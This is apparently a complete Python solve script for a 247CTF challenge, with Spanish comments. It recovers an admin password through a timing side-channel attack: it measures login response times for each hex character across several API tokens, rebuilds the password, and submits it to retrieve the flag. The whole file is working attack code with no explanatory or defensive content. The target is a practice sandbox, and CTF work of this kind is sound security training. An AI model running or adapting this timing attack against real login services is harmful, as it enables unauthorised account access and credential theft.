#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

def get_flag(password):
    resp = requests.post(
        f"{BASE_URL}/api/get_flag",
        data={"password": password},
        timeout=10
    )
    return resp.json()

# Estrategia: hacer múltiples rondas, cada ronda descubre algunos caracteres
# Voy a usar 2 mediciones por carácter para mayor precisión
# 2 × 16 = 32 requests por posición
# 128 / 32 = 4 posiciones por token
# Necesito 32 / 4 = 8 tokens para descubrir todos los caracteres

all_chars = []

for round_num in range(8):
    api_token = get_token()
    known = "".join(all_chars)
    
    positions_this_round = 4
    request_count = 0
    
    for pos_offset in range(positions_this_round):
        if len(all_chars) >= 32:
            break
            
        # Hacer 2 mediciones por carácter
        all_timings = {char: [] for char in HEX_CHARS}
        
        for measurement in range(2):
            for char in HEX_CHARS:
                if request_count >= 120:
                    break
                    
                test_password = known + char + "0" * (31 - len(known))
                result, elapsed = try_password("admin", test_password, api_token)
                all_timings[char].append(elapsed)
                request_count += 1
                
                if result.get("result") == "success":
                    # ¡Éxito!
                    flag_result = get_flag(test_password)
                    if "flag" in str(flag_result).lower():
                        print(flag_result.get("flag", flag_result))
                        exit(0)
        
        # Calcular promedio para cada carácter
        avgs = {}
        for char, times in all_timings.items():
            if times:
                avgs[char] = statistics.mean(times)
        
        if avgs:
            best_char = max(avgs.items(), key=lambda x: x[1])[0]
            all_chars.append(best_char)
            known = "".join(all_chars)

password = "".join(all_chars)
print(f"Contraseña final: {password}")

# Intentar obtener la flag
flag_result = get_flag(password)
if "flag" in str(flag_result).lower():
    print(flag_result.get("flag", flag_result))
else:
    print(f"Resultado: {flag_result}")
